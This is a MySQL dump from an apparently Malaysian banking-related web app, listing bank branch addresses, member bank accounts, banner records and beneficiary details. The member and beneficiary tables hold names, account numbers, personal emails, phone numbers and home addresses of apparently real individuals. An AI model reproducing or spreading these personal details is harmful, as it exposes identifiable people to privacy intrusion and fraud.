(780, 12, 3, 'Wisma Boltex, Jalan Pasar, ', 'Teluk Intan,', '36000 ', '  Perak  ', '05-6223282 , 05-6212325', NULL, NULL, NULL, NULL),
(781, 12, 3, 'Wisma Saudagar, 420, Batu 5, Jalan Ampang, ', 'Ampang ,  ', ' 68000 ', 'Selangor ', '03-42562333, 03-42562636', NULL, NULL, NULL, NULL),
(782, 12, 3, 'No 1 & 3, Jalan Puteri 2/3, Bandar Puteri, ', 'Puchong,  ', '47100 ', 'Selangor', ' 03-8062 8899, 03-8062 7799', NULL, NULL, NULL, NULL),
(783, 12, 3, '3, 4 & 5, Jalan CKC 1, Bandar Baru Batang Kali, ', ' Ulu Selangor, ', '44300', 'Selangor ', '03-60572401, 03-60572402', NULL, NULL, NULL, NULL),
(784, 12, 3, '49, 51 & 53, Jalan SS 21/60, Damansara Utama, ', ' Petaling Jaya,', '47400', '  Selangor', '03-77289376, 03-77289406', NULL, NULL, NULL, NULL),
(785, 12, 3, 'No. 14, 15 & 16, Jalan Raja Haroun, ', 'Kajang,  ', '43000 ', 'Selangor ', '03-8733 5752, 03-8733 5754', NULL, NULL, NULL, NULL),
(786, 12, 3, '28-32, Persiaran Sultan Ibrahim, ', 'Klang,  ', '41300 ', 'Selangor ', '03-33423567, 03-33424048', NULL, NULL, NULL, NULL),
(787, 12, 3, '306, Jalan Besar, Pandamaran, ', 'Port Klang,  ', '42000 ', 'Selangor ', '03-31672830 , 03-31672831', NULL, NULL, NULL, NULL),
(788, 12, 3, '82, Lebuh Beringin, Off Jalan Berangan,  ', ' Port Klang,  ', '42000', 'Selangor', '03-31674550, 03-31674668', NULL, NULL, NULL, NULL),
(789, 12, 3, '8 & 10, Jalan 21/12, Sea Park,  ', 'Petaling Jaya,  ', '46300 ', 'Selangor', '03-78738931, 03-78738932', NULL, NULL, NULL, NULL),
(790, 12, 3, '22B & 23, Jalan Besar, ', 'Semenyih,  ', '43500 ', 'Selangor ', '03-87238811, 03-87238812', NULL, NULL, NULL, NULL),
(791, 12, 3, 'B01 & G01, Plaza Seri Setia, 1, Jalan SS9A/2, ', ' Petaling Jaya,  ', '47300', 'Selangor ', '03-78741944, 03-78741966', NULL, NULL, NULL, NULL),
(792, 12, 3, 'B1- B4, Jalan SS 15/4D, Subang Jaya,  ', 'Petaling Jaya, ', '47500 ', ' Selangor', '03-56332420, 03-56332421', NULL, NULL, NULL, NULL),
(793, 12, 3, 'S11-12, Jalan Rajawali, ', 'Sungai Jarom,  ', '42600 ', 'Selangor ', '03-31912031 , 03-31912032', NULL, NULL, NULL, NULL),
(794, 12, 3, '23, Jalan Kasturi 1, Plaza Kasturi, Off Jalan Balakong, Batu 11', 'Cheras, ', ' 43200 ', ' Selangor ', '03-9075 5202/211', NULL, NULL, NULL, NULL),
(795, 12, 3, ', Jalan Dato'' Yusof Shahbudin 30, Taman Sentosa,  ', 'Klang,  ', '41200 ', 'Selangor  ', '03-5161 3369', NULL, NULL, NULL, NULL),
(796, 12, 3, '3, 5 & 7, Jalan USJ 10/1F, ', 'UEP Subang Jaya,  ', '47620 ', 'Selangorx', '03-56310776, 03-56350617', NULL, NULL, NULL, NULL),
(797, 12, 3, 'No. 69 & 71  Jalan Batu Nilam 1  Bandar Bukit Tinggi  ', 'Klang  ', '41200 ', 'Selangor ', '03-33236006, 03-33231661', NULL, NULL, NULL, NULL),
(798, 12, 3, '48 & 50, Jalan PJS 11/28A, Bandar Sunway,  ', 'Petaling Jaya, ', '46150 ', ' Selangor  ', ' 03-56364138, 03-56362256', NULL, NULL, NULL, NULL),
(799, 12, 3, '23 & 25, Jalan Melati 2B,  Seksyen BB11,  Bandar Bukit Beruntung,  ', ' Rawang,  ', '48300', 'Selangor ', '03-60282170 , 03-60282168', NULL, NULL, NULL, NULL),
(800, 12, 3, '64 & 66, Jalan Tapah Off Jalan Goh Hock Huat, ', 'Kelang, ', '41400 ', ' Selangor', '03-33435193, 03-33419036', NULL, NULL, NULL, NULL),
(801, 12, 3, '34-36, Jalan Lebuh Besar,  Kampung Baru Subang,  ', ' Shah Alam,  ', '40150', 'Selangor', '03-78468986, 03-78468012', NULL, NULL, NULL, NULL),
(802, 12, 3, 'A-1, A-2 & A-3, Sunway Giza Mall Jalan PJU 5/14 Dataran Sunway Kota Damansara ', 'Petaling Jaya ', '47810 ', 'Selangor ', '03-6148 3766', NULL, NULL, NULL, NULL),
(803, 12, 3, '1, 3 & 5, Jalan 52/2, ', 'Petaling Jaya,  ', '46200 ', 'Selangor  ', '03-79570211, 03-79570007', NULL, NULL, NULL, NULL),
(804, 12, 3, '45, Jalan 1B, Batu 17, Taman Jati,', 'Rawang, ', ' 48000 ', ' Selangor  ', '03-6091 8654, 03-6091 8662', NULL, NULL, NULL, NULL),
(805, 12, 3, '12, 14 & 16, Jalan 14/14, ', 'Petaling Jaya,  ', '46100 ', 'Selangor', ' 03-79582585, 03-79582586', NULL, NULL, NULL, NULL),
(806, 12, 3, '19, 21 & 23, Jalan SG 1/6,  Taman Seri Gombak,  ', ' Batu Caves,  ', '68100', 'Selangor  ', ' 03-61886712, 03-61889611', NULL, NULL, NULL, NULL),
(807, 12, 3, '2, 4 & 6, Jalan Pahat G15/G Komplex Otomobil Persiaran Selangor,  Section 15 ', 'Shah Alam ', '40200 ', 'Selangor ', '03-55100567, 55101313', NULL, NULL, NULL, NULL),
(808, 12, 3, 'Lot 403 & 404, Jalan 1A/1, Bandar Baru Sungai Buloh,  ', ' Sungai Buloh, ', '47000', ' Selangor ', '03-61562083, 03-61562056', NULL, NULL, NULL, NULL),
(809, 12, 3, '24-C, Jalan Besar, ', ' Sungai Pelek,  ', '43950', 'Selangor', '03-31411236, 03-31411237', NULL, NULL, NULL, NULL),
(810, 12, 3, '21 & 23, Jalan SS 25/23,  Taman Plaza,  ', 'Petaling Jaya, ', '47301 ', 'Selangor ', '03-7803 9247, 03-7803 0124', NULL, NULL, NULL, NULL),
(811, 12, 3, '2, Jalan Sepadu B25/B, Taman Perindustrian Axis,  Section 25, ', 'Shah Alam,  ', '40400 ', 'Selangor ', '03-51216394, 03-51216395', NULL, NULL, NULL, NULL),
(812, 12, 3, '9 & 10, Jalan Kenari 1, Bandar Puchong Jaya, ', 'Puchong,  ', '47100 ', 'Selangor', '03-58821888, 03-58821889', NULL, NULL, NULL, NULL),
(813, 12, 3, '5, 7 & 9, Jalan Sultan Abdul Samad, ', ' Banting,  ', ' 42700', 'Selangor', '03-3181 3081, 03-3187 2466', NULL, NULL, NULL, NULL),
(814, 12, 3, '1,3 & 5, Jalan SS 22/23 Damansara Jaya,  ', 'Petaling Jaya, ', '47400 ', 'Selangor', '03-7729 8588', NULL, NULL, NULL, NULL),
(815, 12, 3, '252, 252A & 256, Jalan Besar, ', ' Kapar, ', ' 42200', ' Selangor ', '03-3250 0916, 03-3250 0917 ', NULL, NULL, NULL, NULL),
(816, 12, 3, 'F-07, F-08 & F-09, Jalan SS 6/5B, Dataran Glomac, Pusat Bandar Kelana Jaya, ', 'Petaling Jaya', '47301 ', ' Selangor  ', ' 03-78034928, 03-78031267', NULL, NULL, NULL, NULL),
(817, 12, 3, '1 & 3, Jalan Raja Lumu ', 'Kuala Selangor,  ', '45000 ', 'Selangor', ' 03-32894193, 03-32894194', NULL, NULL, NULL, NULL),
(818, 12, 3, 'N19 & O19, Jalan Pasar,  Off Jalan Othman, ', ' Petaling Jaya,  ', ' 46000', 'Selangor  ', '03-77836566, 03-77835785', NULL, NULL, NULL, NULL),
(819, 12, 3, '2180 & 2181, Jalan Menteri, ', ' Sabak Bernam, ', '45200,', ' Selangor', ' 03-32162500, 03-32162805', NULL, NULL, NULL, NULL),
(820, 12, 3, '102, Jalan Sabak Bernam,  ', ' Sekinchan,  ', '45400', 'Selangor', '03-32411263, 03-32411264', NULL, NULL, NULL, NULL),
(821, 12, 3, 'No. 1, Jalan Perusahaan 2, ', 'Seri Kembangan,', '43300 ', ' Selangor  ', ' 03-8939 2000', NULL, NULL, NULL, NULL),
(822, 12, 3, '61-1, 61-2 & 61-3,  Jalan SS 2/75, ', 'Petaling Jaya, ', ' 47300 ', ' Selangor   ', '03-78740436, 03-78741933', NULL, NULL, NULL, NULL),
(823, 12, 3, '1 & 3, Jalan M/J 2,  Taman Majlis Jaya,  Jalan Sungai Chua,  ', 'Kajang,  ', '43000 ', 'Selangor  ', '03-87370228', NULL, NULL, NULL, NULL),
(824, 12, 3, '22, 24, 26 & 28, Lintang Menalu, Taman Chi Liung, ', ' Klang,  ', ' 41200', 'Selangor  ', '03-33718899, 03-33718482', NULL, NULL, NULL, NULL),
(825, 12, 3, '1 & 3, Jalan Bunga Tanjung 6A,  Taman Muda, ', 'Ampang,  ', '68000 ', 'Selangor', '03-4296 1806, 4296 1935', NULL, NULL, NULL, NULL),
(826, 12, 3, '2-1-G, 2-1-1 & 2-1-2, Wisma Pauson, Jalan Taming Kanan Satu,  Taman Taming Jaya,  ', ' Balakong, ', '43300', ' Selangor', '03-89612460, 03-89614980', NULL, NULL, NULL, NULL),
(827, 12, 3, '54, 56 & 58, Lintang Angsana, Bandar Baru Air Itam,  ', 'Pulau Pinang ', '11500 ', 'Pulau Pinang ', '04-8284088 , 04-8286088', NULL, NULL, NULL, NULL),
(828, 12, 3, '11, Jalan Todak 2, Pusatbandar Seberang Jaya, ', 'Seberang Jaya,', '13700 ', '  Pulau Pinang', '04-3971096 , 04-3971105', NULL, NULL, NULL, NULL),
(829, 12, 3, '27A-G-1, 27B-G-1 & 27C-G-1, Jalan Air Itam, ', ' Air Itam,  ', '11500', 'Pulau Pinang', '04-8288591/95', NULL, NULL, NULL, NULL),
(830, 12, 3, '7320, 7321 & 7322 Jalan Raja Uda, ', 'Butterworth,  ', ' 12300 ', 'Pulau Pinang', ' 04-3245297, 04-3245298', NULL, NULL, NULL, NULL),
(831, 12, 3, 'Harbour Trade Centre, 2-1-20 & 2-1-30, 2, Gat Lebuh Macallum, ', 'Pulau Pinang', '10300 ', 'Pulau Pinang', '04-2628442 , 04-2627732', NULL, NULL, NULL, NULL),
(832, 12, 3, '87, Lebuh Bishop,  ', 'Pulau Pinang  ', '10200 ', 'Pulau Pinang ', '04-2613415 , 04-2616755', NULL, NULL, NULL, NULL),
(833, 12, 3, '19, 21 & 23, Jalan Keruing, Kawasan Perniagaan, Simpang Ampat, ', 'Seberang Perai Selatan,  ', ' 14100 ', 'Pulau Pinang  ', ' 04-5887000, 04-5887248', NULL, NULL, NULL, NULL),
(834, 12, 3, ' 11500 Pulau Pinang  Tel: 04-8284088 , 04-8286088 Fax: 04-8280678 Bagan Ajam 6862- 6864, Jalan Bagan Jermal, Bagan Ajam,  ', 'Butterworth, ', '13000', 'Pulau Pinang', ' 04-3317822 , 04-3317823', NULL, NULL, NULL, NULL),
(835, 12, 3, '2644 - 2648, Jalan Che Bee Noor,  ', ' Bukit Mertajam, ', '14000', ' Pulau Pinang', ' 04-5392205 , 04-5392207', NULL, NULL, NULL, NULL),
(836, 12, 3, 'Ground & 1st Floor 456 Jalan Datuk Keramat ', ' Pulau Pinang  ', '10460', ' Pulau Pinang ', '04-226 4571, 04-228 1045', NULL, NULL, NULL, NULL),
(837, 12, 3, '407-A & 409-A, Jalan Jelutong,', 'Jelutong, ', ' 11600 ', ' Pulau Pinang ', ' 04-2813227 , 04-2825230', NULL, NULL, NULL, NULL),
(838, 12, 3, '3619 - 3620, Jalan Che Ahmad,  ', 'Nibong Tebal,  Seberang Perai Selatan,  ', '14300 ', 'Pulau Pinang  ', ' 04-5932216 , 04-5931433', NULL, NULL, NULL, NULL),
(839, 12, 3, '58, Jalan Cantonment,  Pulau Tikus,', ' Pulau Pinang  ', ' 10250', ' Pulau Pinang  ', '04-2286017, 04-2286018', NULL, NULL, NULL, NULL),
(840, 12, 3, '33, 35 & 37,  Jalan Pantai Jerjak 13,  Sungai Nibong,  ', 'Pulau Pinang  ', '11900 ', 'Pulau Pinang ', '04-6586000 ', NULL, NULL, NULL, NULL),
(841, 12, 3, '5,7,9 & 11, Lorong Kampung Jawa, Bandar Bayan Baru,  ', 'Bayan Lepas,  ', '11900 ', 'Pulau Pinang  ', '04-6438200 , 04-6438390', NULL, NULL, NULL, NULL),
(842, 12, 3, '85, 87 & 89,  Jalan Selat, Taman Selat ', ' Butterworth, ', '12000', ' Pulau Pinang ', ' 04-3329837 , 04-3329839', NULL, NULL, NULL, NULL),
(843, 12, 3, '104, 104A & 104B,  Jalan Macalister,  ', ' Pulau Pinang', '10400', ' Pulau Pinang  ', '04-2276842 , 04-2276843', NULL, NULL, NULL, NULL),
(844, 12, 3, '21 & 23, Jalan Bertam, ', 'Kepala Batas,  Seberang Perai Utara,  ', '13200 ', 'Pulau Pinang', '04-5759085 , 04-5759086', NULL, NULL, NULL, NULL),
(845, 12, 3, '2684 & 2685, Jalan Chain Ferry,  Taman Inderawasih,  ', 'Prai,  ', '13600 ', 'Pulau Pinang', '04-3901241 , 04-3901246', NULL, NULL, NULL, NULL),
(846, 12, 3, '1 & 3, Jalan Relau, ', 'Pulau Pinang  ', ' 11900 ', 'Pulau Pinang ', '04-6443112 , 04-6443102', NULL, NULL, NULL, NULL),
(847, 12, 3, '15 & 16, Lorong Sepakat 1, Taman Bandar Raya ', 'Bukit Mertajam,  ', '14000 ', 'Pulau Pinang  ', '04-5300288 , 04-5306327', NULL, NULL, NULL, NULL),
(848, 12, 3, '6, Jalan Tembaga SD5/2A Bandar Sri Damansara ', ' Kuala Lumpur ', '52200', ' Kuala Lumpur ', '03-6272 5741 (Hunting Line),  03-6274 4126, 03-6274 5652', NULL, NULL, NULL, NULL),
(849, 12, 3, '36 & 38, Jalan Maarof,  Bangsar,  ', 'Kuala Lumpur', '59100 ', 'Kuala Lumpur', ' 03-22828929, 03-22828930', NULL, NULL, NULL, NULL),
(850, 12, 3, '150, Jalan Bukit Bintang,  ', 'Kuala Lumpur ', '55100 ', 'Kuala Lumpur  ', '03-21427969', NULL, NULL, NULL, NULL),
(851, 12, 3, '36-40, Medan Setia 2, Plaza Damansara, Bukit Damansara,  ', 'Kuala Lumpur ', '50490 ', 'Kuala Lumpur  ', '03-20954278, 03-20954922', NULL, NULL, NULL, NULL),
(852, 12, 3, '85 & 87, Changkat Thambi Dollah, Off Jalan Pudu, ', 'Kuala Lumpur', ' 55100 ', 'Kuala Lumpur', '03-21454492, 03-21454498', NULL, NULL, NULL, NULL),
(853, 12, 3, 'Sun Complex,  Jalan Bukit Bintang, ', 'Kuala Lumpur ', '55100 ', 'Kuala Lumpur ', '03-21445755, 03-21445759', NULL, NULL, NULL, NULL),
(854, 12, 3, '20-26, Jalan Hang Lekiu, ', 'Kuala Lumpur', '50100 ', 'Kuala Lumpur  ', '03-20787077, 03-20781115', NULL, NULL, NULL, NULL),
(855, 12, 3, 'Wisma Yap Ka, 480, Batu 3, Jalan Ipoh,  ', 'Kuala Lumpur  ', '51200 ', 'Kuala Lumpur   ', '03-40427487, 03-40427488', NULL, NULL, NULL, NULL),
(856, 12, 3, '3045- 3051, Batu 4 1/2, Jalan Kelang Lama,  ', 'Kuala Lumpur   ', '58000 ', 'Kuala Lumpur   ', '03-79811211, 03-79811212', NULL, NULL, NULL, NULL),
(857, 12, 3, '44, 46, 48 & 50 Jalan 6/116B Kuchai Entrepreneurs'' Park Off Jalan Kuchai Lama ', 'Kuala Lumpur  ', '58200 ', 'Kuala Lumpur ', '03-7984 3413 (Direct Line), 03-7980 4377', NULL, NULL, NULL, NULL),
(858, 12, 3, '44 & 46, Jalan Pasar, ', 'Kuala Lumpur   ', '55100 ', 'Kuala Lumpur  ', '03-21429160/10/44', NULL, NULL, NULL, NULL),
(859, 12, 3, 'Ground Floor, Wisma Lim Foo Yong 86, Jalan Raja Chulan,  ', ' Kuala Lumpur  ', '50200', ' Kuala Lumpur  ', '03-21418255, 03-21418366', NULL, NULL, NULL, NULL),
(860, 12, 3, 'Lot G3 & 1A.2, Bangunan KWSP, 5, Jalan Raja Laut, ', 'Kuala Lumpur ', ' 50350 ', 'Kuala Lumpur ', ' 03-26930722', NULL, NULL, NULL, NULL),
(861, 12, 3, 'Bangunan Public Bank, 6, Jalan Sultan Sulaiman,  ', 'Kuala Lumpur  ', '50000 ', 'Kuala Lumpur ', '03-20702711 ', NULL, NULL, NULL, NULL),
(862, 12, 3, '12, Jalan Sungai Besi,  ', 'Kuala Lumpur ', '57100 ', 'Kuala Lumpur ', '03-92214771, 03-92215655', NULL, NULL, NULL, NULL),
(863, 12, 3, 'Lot G.01, Plaza First Nationwide, 161, Jalan Tun H.S. Lee ', ' Kuala Lumpur  ', '50000', ' Kuala Lumpur ', ' 03-20702121, 03-20702234', NULL, NULL, NULL, NULL),
(864, 12, 3, '68, Jalan Tun Sambanthan ', 'Brickfields,  ', '50470 ', 'Kuala Lumpur ', '03-22725930, 03-22736494', NULL, NULL, NULL, NULL),
(865, 12, 3, '3476 & 3477, Garden Street, Jinjang Utara,  ', 'Kuala Lumpur   ', '52000 ', 'Kuala Lumpur   ', '03-62523355, 03-62523356', NULL, NULL, NULL, NULL),
(866, 12, 3, '(Full-Fledged Islamic Banking  Branch)  1-1, 1-2 & 2-3, Plaza RAH No. 111, Jalan Raja Abdullah Kampung Baru ', 'Kuala Lumpur ', '50300 ', 'Kuala Lumpur  ', '03-26927269, 03-26928749', NULL, NULL, NULL, NULL),
(867, 12, 3, '147, 149, 151 & 153, Jalan Rimbunan Raya 1, Laman Rimbunan, Jalan Kepong,', ' Kuala Lumpur  ', ' 52100', ' Kuala Lumpur ', '03-62570032, 03-62570040', NULL, NULL, NULL, NULL),
(868, 12, 3, 'Ground Floor, Menara Public Bank, 146, Jalan Ampang,  ', 'Kuala Lumpur  ', '50450 ', 'Kuala Lumpur ', '03-2176 7888, 03-2163 8866', NULL, 'PBBEMYKL', NULL, NULL),
(869, 12, 3, 'Medan Idaman Business Centre, 4 & 6, Jalan 2/21D, Batu 5, Jalan Gombak, ', 'Kuala Lumpur ', ' 53000 ', 'Kuala Lumpur', '03-40234478, 03-40234467', NULL, NULL, NULL, NULL),
(870, 12, 3, 'No. 1 & 3, Jalan Solaris 1, Solaris Mont'' Kiara, ', ' Kuala Lumpur  ', '50480', ' Kuala Lumpur  ', '03-62036363', NULL, NULL, NULL, NULL),
(871, 12, 3, '3 & 5, Medan Hujan Rahmat, Taman Overseas Union, ', 'Kuala Lumpur ', ' 58200 ', 'Kuala Lumpur  ', '03-77856409, 03-77856410', NULL, NULL, NULL, NULL),
(872, 12, 3, '1, 3 & 5, Jalan Pandan Indah 1/23,  Pandan Indah ,  ', ' Kuala Lumpur  ', '55100', ' Kuala Lumpur  ', '03-92747494, 03-92742495', NULL, NULL, NULL, NULL),
(873, 12, 3, '44, Jalan Pandan 2/2,  Pandan Jaya, ', 'Kuala Lumpur   ', ' 55100 ', 'Kuala Lumpur ', '03-92812199, 03-92863149', NULL, NULL, NULL, NULL),
(874, 12, 3, '31 & 33, Ground Floor, Jalan 3/108C, Taman Sungai Besi,  Salak South, ', ' Kuala Lumpur  ', '57100', ' Kuala Lumpur', '03-7980 5190, 03-7980 2921', NULL, NULL, NULL, NULL),
(875, 12, 3, '75 & 77, Jalan Segambut Pusat,  ', ' Kuala Lumpur  ', '51200', ' Kuala Lumpur ', '03-62527052, 03-62527054', NULL, NULL, NULL, NULL),
(876, 12, 3, '45, 47 & 49, Jalan 2/3A, Pusat Bandar Utara Selayang, Batu Caves, ', ' Kuala Lumpur ', '68100', ' Kuala Lumpur', '03-61368644, 03-61368645, 03-61368649', NULL, NULL, NULL, NULL),
(877, 12, 3, '36, 38 & 40, Jalan 14/48A, Sentul Raya Off Jalan Sentul,  ', ' Kuala Lumpur ', '51000', ' Kuala Lumpur ', '03-40421811, 03-40421509', NULL, NULL, NULL, NULL),
(878, 12, 3, '40-42, Jalan Radin Tengah, Bandar Baru Seri Petaling,  ', ' Kuala Lumpur', '57000', ' Kuala Lumpur ', '03-90585711, 03-90585712', NULL, NULL, NULL, NULL),
(879, 12, 3, '263, 265, 267 & 269,  Jalan Genting Kelang,  Setapak,  ', 'Kuala Lumpur ', '53300 ', 'Kuala Lumpur x', '03-40219341, 03-40219343', NULL, NULL, NULL, NULL),
(880, 12, 3, '1, 3 & 5, Jalan 4/96A,  Taman Cheras Makmur,  ', 'Kuala Lumpur ', '56100 ', 'Kuala Lumpur ', '03-9130 7840, 03-9131 4182', NULL, NULL, NULL, NULL),
(881, 12, 3, '80 & 82, Jalan Cerdas Taman Connaught,  Cheras,', 'Kuala Lumpur  ', ' 56000 ', 'Kuala Lumpur ', '03-91017152, 03-91023649', NULL, NULL, NULL, NULL),
(882, 12, 3, 'Lot 1A-3A, Business Centre,  Taman Desa, Off Jalan Kelang Lama, ', 'Kuala Lumpur  ', ' 58100 ', 'Kuala Lumpur  ', '03-79837811, 03-79837812', NULL, NULL, NULL, NULL),
(883, 12, 3, '275 & 277,  Jalan Mahkota, Taman Maluri, Cheras', 'Kuala Lumpur ', ' 55100 ', 'Kuala Lumpur', '03-92859994, 03-92857203', NULL, NULL, NULL, NULL),
(884, 12, 3, '262- 265, Jalan Bandar 12, Taman Melawati,  ', 'Kuala Lumpur  ', '53100 ', 'Kuala Lumpur  ', ' 03-41052003, 03-41052004', NULL, NULL, NULL, NULL),
(885, 12, 3, '2, Jalan Midah 3,  Taman Midah ', 'Kuala Lumpur  ', '56000 ', 'Kuala Lumpur  ', '03-91300533, 03-91300234', NULL, NULL, NULL, NULL),
(886, 12, 3, '66, 68 & 70 Jalan Burhanuddin Helmi Taman Tun Dr. Ismail', 'Kuala Lumpur  ', ' 60000 ', 'Kuala Lumpur ', '03-7729 4672, 03-7729 9440', NULL, NULL, NULL, NULL),
(887, 12, 3, 'Wisma Public Bank, 300, Jalan Raja Laut, ', 'Kuala Lumpur  ', ' 50350 ', 'Kuala Lumpur', '03-26939555, 03-26939528 ', NULL, NULL, NULL, NULL),
(888, 12, 3, '24-26, Jalan 1A/27A,  Section 1, Wangsa Maju,  ', 'Kuala Lumpur  ', '53300 ', 'Kuala Lumpur ', '03-41428577, 03-41428579', NULL, NULL, NULL, NULL);

-- --------------------------------------------------------

--
-- Table structure for table `banks_category`
--

CREATE TABLE IF NOT EXISTS `banks_category` (
  `bc_id` int(11) NOT NULL AUTO_INCREMENT,
  `bc_name` varchar(200) NOT NULL,
  `bc_fee` varchar(200) DEFAULT '0.00',
  PRIMARY KEY (`bc_id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=3 ;

--
-- Dumping data for table `banks_category`
--

INSERT INTO `banks_category` (`bc_id`, `bc_name`, `bc_fee`) VALUES
(1, 'Malaysia Favorite Bank', '2.00'),
(2, 'International Favorite Bank', '2.00');

-- --------------------------------------------------------

--
-- Table structure for table `banks_members`
--

CREATE TABLE IF NOT EXISTS `banks_members` (
  `bm_id` int(11) NOT NULL AUTO_INCREMENT,
  `me_id` int(11) NOT NULL,
  `bat_id` int(11) NOT NULL,
  `bc_id` int(11) NOT NULL,
  `bbi_id` int(11) NOT NULL,
  `bm_holdername` varchar(200) NOT NULL,
  `bm_accountnumber` varchar(200) NOT NULL,
  PRIMARY KEY (`bm_id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=4 ;

--
-- Dumping data for table `banks_members`
--

INSERT INTO `banks_members` (`bm_id`, `me_id`, `bat_id`, `bc_id`, `bbi_id`, `bm_holdername`, `bm_accountnumber`) VALUES
(1, 13, 1, 1, 1, 'SITI ZULAIKHA', '198735410825'),
(2, 20, 2, 1, 398, 'SHAFIRA', '88888888888888'),
(3, 12, 1, 1, 1, 'SHAFIRA09', '12345678910');

-- --------------------------------------------------------

--
-- Table structure for table `banners`
--

CREATE TABLE IF NOT EXISTS `banners` (
  `ban_id` int(11) NOT NULL AUTO_INCREMENT,
  `ban_image` varchar(2000) DEFAULT NULL,
  `ban_name` varchar(200) NOT NULL,
  `ban_date` date DEFAULT NULL,
  `bty_id` int(11) DEFAULT NULL,
  PRIMARY KEY (`ban_id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=11 ;

--
-- Dumping data for table `banners`
--

INSERT INTO `banners` (`ban_id`, `ban_image`, `ban_name`, `ban_date`, `bty_id`) VALUES
(1, 'd24fa-banner1.png', 'Banner1', '2016-01-20', 1),
(2, 'd52a9-banner2.png', 'Banner2', '2016-01-20', 1),
(3, '4254e-banner3.png', 'Banner3', '2016-01-20', 1),
(4, '94e7e-bannertegak1.png', 'BannerTegak1', '2016-01-21', 2),
(5, 'c6989-bannertegak2.png', 'BannerTegak2', '2016-01-21', 2),
(6, '71c76-bannertegak3.png', 'BannerTegak3', '2016-01-21', 2),
(7, '8afea-1.gif', 'GIF 1', '2016-01-21', 3),
(8, '21e5e-2.gif', 'GIF 2', '2016-01-21', 3),
(9, '042c3-3.gif', 'GIF 3', '2016-01-21', 3),
(10, 'bc362-11295797_847650105290368_6790949361071925503_n.jpg', 'BannerCircle2', '2016-01-21', 7);

-- --------------------------------------------------------

--
-- Table structure for table `banners_type`
--

CREATE TABLE IF NOT EXISTS `banners_type` (
  `bty_id` int(11) NOT NULL AUTO_INCREMENT,
  `bty_desc` varchar(200) NOT NULL,
  PRIMARY KEY (`bty_id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=10 ;

--
-- Dumping data for table `banners_type`
--

INSERT INTO `banners_type` (`bty_id`, `bty_desc`) VALUES
(1, 'Horizontal Banner'),
(2, 'Vertical Banner'),
(3, 'GIF Banner'),
(4, 'Group Banner'),
(5, 'Gila Banner'),
(6, 'Colour Banner'),
(7, 'Circle Banner'),
(8, 'Formal Banner'),
(9, 'Corporate Banner');

-- --------------------------------------------------------

--
-- Table structure for table `batch_bids`
--

CREATE TABLE IF NOT EXISTS `batch_bids` (
  `bb_id` int(11) NOT NULL AUTO_INCREMENT,
  `bb_desc` varchar(200) NOT NULL,
  `bb_status` int(11) NOT NULL DEFAULT '1',
  PRIMARY KEY (`bb_id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=3 ;

--
-- Dumping data for table `batch_bids`
--

INSERT INTO `batch_bids` (`bb_id`, `bb_desc`, `bb_status`) VALUES
(1, 'Batch 1', 1),
(2, 'Batch 2', 1);

-- --------------------------------------------------------

--
-- Table structure for table `ba_account_type`
--

CREATE TABLE IF NOT EXISTS `ba_account_type` (
  `bat_id` int(11) NOT NULL AUTO_INCREMENT,
  `bat_name` varchar(200) NOT NULL,
  PRIMARY KEY (`bat_id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=5 ;

--
-- Dumping data for table `ba_account_type`
--

INSERT INTO `ba_account_type` (`bat_id`, `bat_name`) VALUES
(1, 'Personal Checking'),
(2, 'Personal Saving'),
(3, 'Business Checking'),
(4, 'Business Saving');

-- --------------------------------------------------------

--
-- Table structure for table `bene_info_waris`
--

CREATE TABLE IF NOT EXISTS `bene_info_waris` (
  `biw_id` int(11) NOT NULL AUTO_INCREMENT,
  `me_id` int(11) NOT NULL,
  `biw_firstname` varchar(200) NOT NULL,
  `biw_lastname` varchar(200) NOT NULL,
  `g_id_biw` int(11) NOT NULL DEFAULT '1',
  `biw_relationship` varchar(200) NOT NULL,
  `biw_email` varchar(200) NOT NULL,
  `biw_phone` varchar(20) NOT NULL,
  `biw_address` varchar(500) NOT NULL,
  `biw_city` varchar(200) NOT NULL,
  `biw_state` varchar(200) NOT NULL,
  `biw_postcode` varchar(20) NOT NULL,
  `biw_country` varchar(200) NOT NULL,
  `biw_status` int(11) NOT NULL DEFAULT '1',
  PRIMARY KEY (`biw_id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=46 ;

--
-- Dumping data for table `bene_info_waris`
--

INSERT INTO `bene_info_waris` (`biw_id`, `me_id`, `biw_firstname`, `biw_lastname`, `g_id_biw`, `biw_relationship`, `biw_email`, `biw_phone`, `biw_address`, `biw_city`, `biw_state`, `biw_postcode`, `biw_country`, `biw_status`) VALUES
(1, 1, 'HAMBARAN', 'ABD SAMAD', 1, 'FATHER', 'hambaran@gmail.com', '0199318284', '91, JALAN KERAI, SG. RETANG.', 'JERANTUT', 'PAHANG', '27000', 'MALAYSIA', 1),
(2, 2, '', '', 1, '', '', '', '', '', '', '', '', 1),
(4, 4, '', '', 1, '', '', '', '', '', '', '', '', 1),
(5, 5, '', '', 1, '', '', '', '', '', '', '', '', 1),
(7, 3, 'Mustafa', '-', 1, 'Father', 'mustafa@gmail.com', '0199993323', 'Rumah di Taman Cempaka', 'Ipoh', 'Perak', '-', 'Malaysia', 1),
(8, 6, 'HAMBARAN', 'ABD SAMAD', 1, 'FATHER', 'hambaransamad@yahoo.com', '0199318284', '91, JALAN KERAI, SG. RETANG.', 'JERANTUT', 'PAHANG', '27000', 'Malaysia', 1),
(9, 7, '', '', 1, '', '', '', '', '', '', '', '', 1),
(10, 8, '', '', 1, '', '', '', '', '', '', '', '', 1),
(11, 9, '', '', 1, '', '', '', '', '', '', '', '', 1),
(12, 10, '', '', 1, '', '', '', '', '', '', '', '', 1),
(13, 11, '', '', 1, '', '', '', '', '', '', '', '', 1),
(14, 24, '', '', 1, '', '', '', '', '', '', '', '', 1),
(15, 25, '', '', 1, '', '', '', '', '', '', '', '', 1),
(16, 26, 'Raja Puteri Shafiqkin', 'Raja Mokhtar', 2, 'Wife', 'rajaputerishafiqkin@gmail.com', '0133118971', 'No 29, Jalan Jati 18', 'Batu Berendam', 'Melaka', '75350', 'Malaysia', 1),
(17, 27, '', '', 1, '', '', '', '', '', '', '', '', 1),
